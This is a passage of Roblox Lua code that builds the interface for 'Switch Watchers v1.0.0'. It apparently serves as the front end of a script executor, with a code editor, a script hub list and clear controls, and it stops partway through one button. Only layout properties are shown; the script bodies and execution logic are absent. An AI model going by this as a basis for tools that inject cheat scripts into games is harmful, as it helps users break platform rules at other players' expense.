local v0 = {};
v0["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
v0["1"]['ResetOnSpawn'] = false;
v0["1"]['Name'] = [[SwitchWatcher]];
v0["1"]['ZIndexBehavior'] = Enum.ZIndexBehavior.Sibling;
v0["2"] = Instance.new("Frame", v0["1"]);
v0["2"]['ZIndex'] = -1;
v0["2"]['BorderSizePixel'] = 0;
v0["2"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["2"]['Size'] = UDim2.new(0, 611, 0, 352);
v0["2"]['ClipsDescendants'] = true;
v0["2"]['Position'] = UDim2.new(0.20000000298023224, 0, 0.10000000149011612, 0);
v0["2"]['Name'] = [[Main]];
v0["3"] = Instance.new("ImageLabel", v0["2"]);
v0["3"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["3"]['ScaleType'] = Enum.ScaleType.Slice;
v0["3"]['BackgroundColor3'] = Color3.fromRGB(19, 19, 19);
v0["3"]['ImageColor3'] = Color3.fromRGB(21, 21, 21);
v0["3"]['SliceScale'] = 0.029999999329447746;
v0["3"]['Image'] = [[rbxassetid://3570695787]];
v0["3"]['Size'] = UDim2.new(1, 0, 0, 29);
v0["3"]['Name'] = [[Topbar]];
v0["3"]['BackgroundTransparency'] = 1;
v0["4"] = Instance.new("Frame", v0["3"]);
v0["4"]['ZIndex'] = 3;
v0["4"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["4"]['AnchorPoint'] = Vector2.new(1, 0.5);
v0["4"]['BackgroundTransparency'] = 1;
v0["4"]['Size'] = UDim2.new(1, 0, 0, 31);
v0["4"]['Position'] = UDim2.new(1, -10, 0.5, 0);
v0["4"]['Name'] = [[RightOutline]];
v0["5"] = Instance.new("UIListLayout", v0["4"]);
v0["5"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["5"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["5"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Right;
v0["5"]['Padding'] = UDim.new(0, 5);
v0["5"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["6"] = Instance.new("ImageLabel", v0["4"]);
v0["6"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["6"]['ImageColor3'] = Color3.fromRGB(34, 34, 34);
v0["6"]['Image'] = [[rbxassetid://4467776646]];
v0["6"]['Size'] = UDim2.new(0, 14, 0, 14);
v0["6"]['BackgroundTransparency'] = 1;
v0["7"] = Instance.new("TextButton", v0["6"]);
v0["7"]['TextSize'] = 14;
v0["7"]['TextTransparency'] = 1;
v0["7"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["7"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["7"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["7"]['Name'] = [[Hitbox]];
v0["7"]['Text'] = [[]];
v0["7"]['Font'] = Enum.Font.SourceSans;
v0["7"]['BackgroundTransparency'] = 1;
v0["8"] = Instance.new("ImageLabel", v0["6"]);
v0["8"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["8"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["8"]['Image'] = [[rbxassetid://5768110591]];
v0["8"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["8"]['Name'] = [[icon]];
v0["8"]['BackgroundTransparency'] = 1;
v0["9"] = Instance.new("ModuleScript", v0["6"]);
v0["9"]['Name'] = [[toggler]];
v0['a'] = Instance.new("Frame", v0["3"]);
v0['a']['BorderSizePixel'] = 0;
v0['a']['BackgroundColor3'] = Color3.fromRGB(21, 21, 21);
v0['a']['AnchorPoint'] = Vector2.new(0.5, 1);
v0['a']['Size'] = UDim2.new(1, 0, 0, 3);
v0['a']['Position'] = UDim2.new(0.5010519027709961, 0, 1, 0);
v0['b'] = Instance.new("TextLabel", v0["3"]);
v0['b']['TextWrapped'] = true;
v0['b']['TextScaled'] = true;
v0['b']['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0['b']['TextSize'] = 20;
v0['b']['TextColor3'] = Color3.fromRGB(255, 255, 255);
v0['b']['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0['b']['Size'] = UDim2.new(1, 0, 0.6330000162124634, 0);
v0['b']['Text'] = [[Switch Watchers - v1.0.0]];
v0['b']['Name'] = [[VersionTitle]];
v0['b']['Font'] = Enum.Font.Roboto;
v0['b']['BackgroundTransparency'] = 1;
v0['b']['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0['c'] = Instance.new("TextButton", v0["3"]);
v0['c']['TextSize'] = 14;
v0['c']['TextTransparency'] = 1;
v0['c']['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0['c']['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0['c']['Size'] = UDim2.new(1, 0, 1, 0);
v0['c']['Name'] = [[Hitbox]];
v0['c']['Text'] = [[]];
v0['c']['Font'] = Enum.Font.SourceSans;
v0['c']['BackgroundTransparency'] = 1;
v0['d'] = Instance.new("ImageLabel", v0["2"]);
v0['d']['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0['d']['ScaleType'] = Enum.ScaleType.Slice;
v0['d']['BackgroundColor3'] = Color3.fromRGB(17, 17, 17);
v0['d']['ImageColor3'] = Color3.fromRGB(19, 19, 19);
v0['d']['SliceScale'] = 0.029999999329447746;
v0['d']['Image'] = [[rbxassetid://3570695787]];
v0['d']['Size'] = UDim2.new(0, 43, 1, -32);
v0['d']['Name'] = [[Sidebar]];
v0['d']['BackgroundTransparency'] = 1;
v0['d']['Position'] = UDim2.new(0, 0, 0, 32);
v0['e'] = Instance.new("Folder", v0['d']);
v0['e']['Name'] = [[Borders]];
v0['f'] = Instance.new("Frame", v0['e']);
v0['f']['BorderSizePixel'] = 0;
v0['f']['BackgroundColor3'] = Color3.fromRGB(19, 19, 19);
v0['f']['AnchorPoint'] = Vector2.new(0.5, 0);
v0['f']['Size'] = UDim2.new(0, 10, 0, 313);
v0['f']['Position'] = UDim2.new(0.7248364686965942, 0, 0, 0);
v0["10"] = Instance.new("Frame", v0['e']);
v0["10"]['BorderSizePixel'] = 0;
v0["10"]['BackgroundColor3'] = Color3.fromRGB(19, 19, 19);
v0["10"]['AnchorPoint'] = Vector2.new(0.5, 0);
v0["10"]['Size'] = UDim2.new(0, 22, 0, 6);
v0["10"]['Position'] = UDim2.new(0.7441860437393188, 0, 0, 0);
v0["11"] = Instance.new("Frame", v0['d']);
v0["11"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["11"]['AnchorPoint'] = Vector2.new(0.5, 1);
v0["11"]['BackgroundTransparency'] = 1;
v0["11"]['Size'] = UDim2.new(0, 43, 0, 142);
v0["11"]['Position'] = UDim2.new(0.5, 0, 1, -6);
v0["11"]['Name'] = [[Bottom]];
v0["12"] = Instance.new("UIListLayout", v0["11"]);
v0["12"]['VerticalAlignment'] = Enum.VerticalAlignment.Bottom;
v0["12"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["12"]['Padding'] = UDim.new(0, 10);
v0["13"] = Instance.new("ImageLabel", v0["11"]);
v0["13"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["13"]['ImageColor3'] = Color3.fromRGB(35, 35, 35);
v0["13"]['Image'] = [[rbxassetid://3570695787]];
v0["13"]['Size'] = UDim2.new(0, 28, 0, 28);
v0["13"]['Name'] = [[InviteBtn]];
v0["13"]['BackgroundTransparency'] = 1;
v0["14"] = Instance.new("ImageLabel", v0["13"]);
v0["14"]['ScaleType'] = Enum.ScaleType.Fit;
v0["14"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["14"]['ImageColor3'] = Color3.fromRGB(182, 182, 182);
v0["14"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["14"]['Image'] = [[rbxassetid://4503342956]];
v0["14"]['Size'] = UDim2.new(0.7229999899864197, 0, 0.7229999899864197, 0);
v0["14"]['BackgroundTransparency'] = 1;
v0["14"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["15"] = Instance.new("TextButton", v0["13"]);
v0["15"]['TextSize'] = 14;
v0["15"]['TextTransparency'] = 1;
v0["15"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["15"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["15"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["15"]['Name'] = [[Hitbox]];
v0["15"]['Text'] = [[]];
v0["15"]['Font'] = Enum.Font.SourceSans;
v0["15"]['BackgroundTransparency'] = 1;
v0["16"] = Instance.new("LocalScript", v0["13"]);
v0["16"]['Name'] = [[handler]];
v0["17"] = Instance.new("TextLabel", v0["11"]);
v0["17"]['TextWrapped'] = true;
v0["17"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["17"]['TextSize'] = 11;
v0["17"]['TextColor3'] = Color3.fromRGB(208, 208, 208);
v0["17"]['AnchorPoint'] = Vector2.new(0.5, 0);
v0["17"]['Size'] = UDim2.new(1, 0, 0, 40);
v0["17"]['Text'] = [[0
——
0]];
v0["17"]['Name'] = [[CharCounter]];
v0["17"]['Font'] = Enum.Font.Ubuntu;
v0["17"]['BackgroundTransparency'] = 1;
v0["18"] = Instance.new("LocalScript", v0["17"]);
v0["18"]['Name'] = [[handler]];
v0["19"] = Instance.new("Frame", v0['d']);
v0["19"]['ZIndex'] = 3;
v0["19"]['BorderSizePixel'] = 0;
v0["19"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["19"]['AnchorPoint'] = Vector2.new(0.5, 0);
v0["19"]['BackgroundTransparency'] = 1;
v0["19"]['Size'] = UDim2.new(0, 43, 0, 141);
v0["19"]['Position'] = UDim2.new(0.5080659985542297, 0, 0.04792332276701927, 0);
v0["19"]['Name'] = [[Top]];
v0["1a"] = Instance.new("ImageLabel", v0["19"]);
v0["1a"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1a"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1a"]['ImageColor3'] = Color3.fromRGB(182, 182, 182);
v0["1a"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["1a"]['Image'] = [[rbxassetid://4370345144]];
v0["1a"]['Size'] = UDim2.new(0, 20, 0, 20);
v0["1a"]['Name'] = [[HomeBtn]];
v0["1a"]['BackgroundTransparency'] = 1;
v0["1a"]['Position'] = UDim2.new(0.5, 0, 0, 5);
v0["1b"] = Instance.new("TextButton", v0["1a"]);
v0["1b"]['TextSize'] = 14;
v0["1b"]['TextTransparency'] = 1;
v0["1b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1b"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["1b"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["1b"]['Name'] = [[Hitbox]];
v0["1b"]['Text'] = [[]];
v0["1b"]['Font'] = Enum.Font.SourceSans;
v0["1b"]['BackgroundTransparency'] = 1;
v0["1c"] = Instance.new("ImageLabel", v0["19"]);
v0["1c"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1c"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1c"]['ImageColor3'] = Color3.fromRGB(38, 38, 38);
v0["1c"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["1c"]['Image'] = [[rbxassetid://4370346095]];
v0["1c"]['Size'] = UDim2.new(0, 20, 0, 20);
v0["1c"]['Name'] = [[MenuBtn]];
v0["1c"]['BackgroundTransparency'] = 1;
v0["1c"]['Position'] = UDim2.new(0.5, 0, 0, 45);
v0["1d"] = Instance.new("TextButton", v0["1c"]);
v0["1d"]['TextSize'] = 14;
v0["1d"]['TextTransparency'] = 1;
v0["1d"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1d"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["1d"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["1d"]['Name'] = [[Hitbox]];
v0["1d"]['Text'] = [[]];
v0["1d"]['Font'] = Enum.Font.SourceSans;
v0["1d"]['BackgroundTransparency'] = 1;
v0["1e"] = Instance.new("ImageLabel", v0["19"]);
v0["1e"]['ScaleType'] = Enum.ScaleType.Fit;
v0["1e"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1e"]['ImageColor3'] = Color3.fromRGB(38, 38, 38);
v0["1e"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["1e"]['Image'] = [[rbxassetid://3605022185]];
v0["1e"]['Size'] = UDim2.new(0, 20, 0, 20);
v0["1e"]['Name'] = [[SettingsBtn]];
v0["1e"]['BackgroundTransparency'] = 1;
v0["1e"]['Position'] = UDim2.new(0.5, 0, 0, 85);
v0["1f"] = Instance.new("TextButton", v0["1e"]);
v0["1f"]['TextSize'] = 14;
v0["1f"]['TextTransparency'] = 1;
v0["1f"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["1f"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["1f"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["1f"]['Name'] = [[Hitbox]];
v0["1f"]['Text'] = [[]];
v0["1f"]['Font'] = Enum.Font.SourceSans;
v0["1f"]['BackgroundTransparency'] = 1;
v0["20"] = Instance.new("ImageButton", v0["19"]);
v0["20"]['Active'] = false;
v0["20"]['ZIndex'] = 0;
v0["20"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["20"]['ScaleType'] = Enum.ScaleType.Slice;
v0["20"]['SliceScale'] = 0.07000000029802322;
v0["20"]['BackgroundColor3'] = Color3.fromRGB(35, 35, 35);
v0["20"]['ImageColor3'] = Color3.fromRGB(41, 41, 41);
v0["20"]['Selectable'] = false;
v0["20"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["20"]['Image'] = [[rbxassetid://3570695787]];
v0["20"]['Size'] = UDim2.new(0, 25, 0, 25);
v0["20"]['Name'] = [[bg]];
v0["20"]['Position'] = UDim2.new(0.5, 0, 0, 5);
v0["20"]['BackgroundTransparency'] = 1;
v0["21"] = Instance.new("LocalScript", v0['d']);
v0["21"]['Name'] = [[handler]];
v0["22"] = Instance.new("UICorner", v0["2"]);
v0["22"]['CornerRadius'] = UDim.new(0, 5);
v0["23"] = Instance.new("Frame", v0["2"]);
v0["23"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["23"]['BackgroundTransparency'] = 1;
v0["23"]['Size'] = UDim2.new(1, -43, 1, -32);
v0["23"]['ClipsDescendants'] = true;
v0["23"]['Position'] = UDim2.new(0, 43, 0, 32);
v0["23"]['Name'] = [[BodyClipping]];
v0["24"] = Instance.new("ImageLabel", v0["23"]);
v0["24"]['ZIndex'] = 2;
v0["24"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["24"]['ScaleType'] = Enum.ScaleType.Slice;
v0["24"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["24"]['ImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["24"]['SliceScale'] = 0.029999999329447746;
v0["24"]['Image'] = [[rbxassetid://3570695787]];
v0["24"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["24"]['Name'] = [[Executor]];
v0["24"]['BackgroundTransparency'] = 1;
v0["24"]['Position'] = UDim2.new(0, 0, -0.003000000026077032, 0);
v0["25"] = Instance.new("Folder", v0["24"]);
v0["25"]['Name'] = [[Borders]];
v0["26"] = Instance.new("Frame", v0["25"]);
v0["26"]['BorderSizePixel'] = 0;
v0["26"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["26"]['Size'] = UDim2.new(0, 9, 0, 313);
v0["26"]['Position'] = UDim2.new(-9.137e-8, 0, 0, 0);
v0["27"] = Instance.new("Frame", v0["25"]);
v0["27"]['BorderSizePixel'] = 0;
v0["27"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["27"]['Size'] = UDim2.new(0, 663, 0, 6);
v0["27"]['Position'] = UDim2.new(-4.5963965e-8, 0, 0, 0);
v0["28"] = Instance.new("Frame", v0["24"]);
v0["28"]['ZIndex'] = 2;
v0["28"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["28"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["28"]['BackgroundTransparency'] = 1;
v0["28"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["28"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["28"]['Name'] = [[InnerBody]];
v0["29"] = Instance.new("ImageLabel", v0["28"]);
v0["29"]['ZIndex'] = 2;
v0["29"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["29"]['ScaleType'] = Enum.ScaleType.Slice;
v0["29"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["29"]['ImageColor3'] = Color3.fromRGB(255, 255, 255);
v0["29"]['SliceScale'] = 0.05000000074505806;
v0["29"]['Image'] = [[rbxassetid://3570695787]];
v0["29"]['Size'] = UDim2.new(1, -129, 1, -79);
v0["29"]['Name'] = [[SourceBg]];
v0["29"]['BackgroundTransparency'] = 1;
v0["29"]['Position'] = UDim2.new(0, 10, 0, 38);
v0["2a"] = Instance.new("ScrollingFrame", v0["29"]);
v0["2a"]['Active'] = true;
v0["2a"]['ScrollingDirection'] = Enum.ScrollingDirection.Y;
v0["2a"]['ZIndex'] = 2;
v0["2a"]['BorderSizePixel'] = 0;
v0["2a"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["2a"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["2a"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["2a"]['LayoutOrder'] = 1;
v0["2a"]['Size'] = UDim2.new(1, -7, 1, -9);
v0["2a"]['ScrollBarThickness'] = 3;
v0["2a"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["2a"]['Name'] = [[Source]];
v0["2b"] = Instance.new("ScrollingFrame", v0["2a"]);
v0["2b"]['Active'] = true;
v0["2b"]['BorderSizePixel'] = 0;
v0["2b"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["2b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["2b"]['BackgroundTransparency'] = 1;
v0["2b"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["2b"]['ScrollBarImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["2b"]['ScrollBarThickness'] = 5;
v0["2c"] = Instance.new("TextBox", v0["2b"]);
v0["2c"]['ZIndex'] = 7;
v0["2c"]['TextColor3'] = Color3.fromRGB(66, 66, 66);
v0["2c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["2c"]['TextSize'] = 15;
v0["2c"]['TextYAlignment'] = Enum.TextYAlignment.Top;
v0["2c"]['BackgroundColor3'] = Color3.fromRGB(31, 31, 31);
v0["2c"]['LayoutOrder'] = 5;
v0["2c"]['MultiLine'] = true;
v0["2c"]['BackgroundTransparency'] = 1;
v0["2c"]['Size'] = UDim2.new(1, -32, 1, 0);
v0["2c"]['Text'] = [[]];
v0["2c"]['Position'] = UDim2.new(0, 32, 0, 0);
v0["2c"]['Font'] = Enum.Font.Code;
v0["2c"]['Name'] = [[SourceBox]];
v0["2c"]['ClearTextOnFocus'] = false;
v0["2d"] = Instance.new("TextLabel", v0["2b"]);
v0["2d"]['ZIndex'] = 2;
v0["2d"]['RichText'] = true;
v0["2d"]['TextYAlignment'] = Enum.TextYAlignment.Top;
v0["2d"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["2d"]['TextSize'] = 15;
v0["2d"]['TextColor3'] = Color3.fromRGB(255, 255, 255);
v0["2d"]['Size'] = UDim2.new(0, 30, 1, 0);
v0["2d"]['BorderColor3'] = Color3.fromRGB(26, 26, 26);
v0["2d"]['Text'] = [[1]];
v0["2d"]['Name'] = [[Lines]];
v0["2d"]['Font'] = Enum.Font.Code;
v0["2d"]['BackgroundTransparency'] = 1;
v0["2e"] = Instance.new("Frame", v0["2d"]);
v0["2e"]['ZIndex'] = 2;
v0["2e"]['BorderSizePixel'] = 0;
v0["2e"]['BackgroundColor3'] = Color3.fromRGB(51, 51, 51);
v0["2e"]['Size'] = UDim2.new(0, -1, 1, 0);
v0["2e"]['Position'] = UDim2.new(1, 0, 0.0010000000474974513, 0);
v0["2f"] = Instance.new("ModuleScript", v0["2a"]);
v0["2f"]['Name'] = [[ide]];
v0["30"] = Instance.new("ModuleScript", v0["2f"]);
v0["30"]['Name'] = [[highlight]];
v0["31"] = Instance.new("ModuleScript", v0["30"]);
v0["31"]['Name'] = [[lexer]];
v0["32"] = Instance.new("ModuleScript", v0["31"]);
v0["32"]['Name'] = [[language]];
v0["33"] = Instance.new("ImageLabel", v0["28"]);
v0["33"]['ZIndex'] = 2;
v0["33"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["33"]['ScaleType'] = Enum.ScaleType.Slice;
v0["33"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["33"]['ImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["33"]['SliceScale'] = 0.05000000074505806;
v0["33"]['AnchorPoint'] = Vector2.new(1, 0.5);
v0["33"]['Image'] = [[rbxassetid://3570695787]];
v0["33"]['Size'] = UDim2.new(0, 113, 1, -79);
v0["33"]['BorderColor3'] = Color3.fromRGB(255, 255, 255);
v0["33"]['Name'] = [[Scripthub]];
v0["33"]['Position'] = UDim2.new(1, 0, 0.5, 0);
v0["34"] = Instance.new("ScrollingFrame", v0["33"]);
v0["34"]['Active'] = true;
v0["34"]['ScrollingDirection'] = Enum.ScrollingDirection.Y;
v0["34"]['ZIndex'] = 2;
v0["34"]['BorderSizePixel'] = 0;
v0["34"]['CanvasSize'] = UDim2.new(0, 0, 0, 0);
v0["34"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["34"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["34"]['BackgroundTransparency'] = 1;
v0["34"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["34"]['ScrollBarImageColor3'] = Color3.fromRGB(168, 168, 168);
v0["34"]['ScrollBarThickness'] = 3;
v0["34"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["34"]['Name'] = [[Scripts]];
v0["35"] = Instance.new("UIListLayout", v0["34"]);
v0["35"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["35"]['Padding'] = UDim.new(0, 5);
v0["35"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["36"] = Instance.new("ImageLabel", v0["34"]);
v0["36"]['ZIndex'] = -1;
v0["36"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["36"]['ScaleType'] = Enum.ScaleType.Slice;
v0["36"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["36"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["36"]['SliceScale'] = 0.029999999329447746;
v0["36"]['Selectable'] = true;
v0["36"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["36"]['Image'] = [[rbxassetid://3570695787]];
v0["36"]['Size'] = UDim2.new(0.8999999761581421, 0, 0, 18);
v0["36"]['Active'] = true;
v0["36"]['Name'] = [[dummy]];
v0["36"]['BackgroundTransparency'] = 1;
v0["36"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["37"] = Instance.new("ImageLabel", v0["36"]);
v0["37"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["37"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["37"]['Image'] = [[rbxassetid://8150715986]];
v0["37"]['Size'] = UDim2.new(0, 12, 0, 12);
v0["37"]['Name'] = [[icon]];
v0["37"]['BackgroundTransparency'] = 1;
v0["37"]['Position'] = UDim2.new(0, 5, 0.5, 0);
v0["38"] = Instance.new("TextButton", v0["36"]);
v0["38"]['TextSize'] = 14;
v0["38"]['TextTransparency'] = 1;
v0["38"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["38"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["38"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["38"]['Name'] = [[Hitbox]];
v0["38"]['Text'] = [[]];
v0["38"]['Font'] = Enum.Font.SourceSans;
v0["38"]['BackgroundTransparency'] = 1;
v0["39"] = Instance.new("TextLabel", v0["36"]);
v0["39"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["39"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["39"]['TextSize'] = 14;
v0["39"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["39"]['Size'] = UDim2.new(1, -30, 1, 0);
v0["39"]['Text'] = [[N/A]];
v0["39"]['Name'] = [[Template]];
v0["39"]['Font'] = Enum.Font.SourceSans;
v0["39"]['BackgroundTransparency'] = 1;
v0["39"]['Position'] = UDim2.new(0, 25, 0, 0);
v0["3a"] = Instance.new("ImageButton", v0["36"]);
v0["3a"]['BackgroundColor3'] = Color3.fromRGB(200, 19, 31);
v0["3a"]['ImageColor3'] = Color3.fromRGB(196, 196, 196);
v0["3a"]['AnchorPoint'] = Vector2.new(1, 0.5);
v0["3a"]['Image'] = [[rbxassetid://7681033210]];
v0["3a"]['Size'] = UDim2.new(0, 18, 0, 18);
v0["3a"]['Name'] = [[Delete]];
v0["3a"]['Position'] = UDim2.new(1, 0, 0.5, 0);
v0["3a"]['BackgroundTransparency'] = 1;
v0["3b"] = Instance.new("ImageLabel", v0["33"]);
v0["3b"]['ZIndex'] = 2;
v0["3b"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["3b"]['ScaleType'] = Enum.ScaleType.Slice;
v0["3b"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["3b"]['ImageColor3'] = Color3.fromRGB(0, 0, 0);
v0["3b"]['SliceScale'] = 0.05000000074505806;
v0["3b"]['Selectable'] = true;
v0["3b"]['Image'] = [[rbxassetid://3570695787]];
v0["3b"]['Size'] = UDim2.new(0, 104, 0, 23);
v0["3b"]['Active'] = true;
v0["3b"]['BorderColor3'] = Color3.fromRGB(255, 255, 255);
v0["3b"]['Name'] = [[TextBox]];
v0["3b"]['Position'] = UDim2.new(0, 0, 0, -30);
v0["3c"] = Instance.new("TextBox", v0["3b"]);
v0["3c"]['PlaceholderColor3'] = Color3.fromRGB(126, 126, 126);
v0["3c"]['ZIndex'] = 2;
v0["3c"]['BorderSizePixel'] = 0;
v0["3c"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["3c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["3c"]['TextWrapped'] = true;
v0["3c"]['TextTruncate'] = Enum.TextTruncate.AtEnd;
v0["3c"]['TextSize'] = 16;
v0["3c"]['BackgroundColor3'] = Color3.fromRGB(0, 0, 0);
v0["3c"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["3c"]['PlaceholderText'] = [[Search..]];
v0["3c"]['Size'] = UDim2.new(0, 88, 0, 23);
v0["3c"]['BorderColor3'] = Color3.fromRGB(255, 120, 0);
v0["3c"]['Text'] = [[]];
v0["3c"]['Position'] = UDim2.new(0.45694321393966675, 0, 0.5, 0);
v0["3c"]['Font'] = Enum.Font.SourceSans;
v0["3c"]['ClearTextOnFocus'] = false;
v0["3d"] = Instance.new("ImageLabel", v0["3b"]);
v0["3d"]['ZIndex'] = 2;
v0["3d"]['ScaleType'] = Enum.ScaleType.Fit;
v0["3d"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["3d"]['AnchorPoint'] = Vector2.new(1, 0.5);
v0["3d"]['Image'] = [[rbxassetid://3605509925]];
v0["3d"]['Size'] = UDim2.new(0, 17, 0, 17);
v0["3d"]['BorderColor3'] = Color3.fromRGB(231, 255, 0);
v0["3d"]['BackgroundTransparency'] = 1;
v0["3d"]['Position'] = UDim2.new(1, 0, 0.5, 0);
v0["3e"] = Instance.new("LocalScript", v0["3b"]);
v0["3e"]['Name'] = [[handler]];
v0["3f"] = Instance.new("Frame", v0["28"]);
v0["3f"]['ZIndex'] = 2;
v0["3f"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["3f"]['AnchorPoint'] = Vector2.new(0, 1);
v0["3f"]['BackgroundTransparency'] = 1;
v0["3f"]['Size'] = UDim2.new(1, -129, 0, 24);
v0["3f"]['Position'] = UDim2.new(0, 10, 1, -8);
v0["3f"]['Name'] = [[BottomButtons]];
v0["40"] = Instance.new("UIListLayout", v0["3f"]);
v0["40"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["40"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["40"]['Padding'] = UDim.new(0, 5);
v0["40"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["41"] = Instance.new("ImageButton", v0["3f"]);
v0["41"]['Active'] = false;
v0["41"]['ZIndex'] = 2;
v0["41"]['SliceCenter'] = Rect.new(100, 100, 100, 100);
v0["41"]['ScaleType'] = Enum.ScaleType.Slice;
v0["41"]['SliceScale'] = 0.029999999329447746;
v0["41"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["41"]['ImageColor3'] = Color3.fromRGB(26, 26, 26);
v0["41"]['Selectable'] = false;
v0["41"]['LayoutOrder'] = 1;
v0["41"]['Image'] = [[rbxassetid://3570695787]];
v0["41"]['Size'] = UDim2.new(0, 107, 0, 24);
v0["41"]['Name'] = [[ClearBtn]];
v0["41"]['Position'] = UDim2.new(0, 0, -1.5833333730697632, 0);
v0["41"]['BackgroundTransparency'] = 1;
v0["42"] = Instance.new("ImageButton", v0["41"]);
v0["42"]['ZIndex'] = 2;
v0["42"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
